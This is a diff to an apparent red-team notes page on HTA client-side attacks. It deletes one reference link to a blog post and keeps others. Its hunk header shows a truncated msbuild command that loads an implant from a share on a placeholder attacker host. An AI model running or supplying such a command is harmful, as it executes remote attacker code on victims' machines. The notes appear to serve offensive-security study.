@@ -29,10 +29,6 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implan
 
 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/HTA]]
 
-### Sevagas
-
-- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)
-
 ### DMCXBlue
 
 - [DMCXBlue: HTA](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/weaponization/hta)
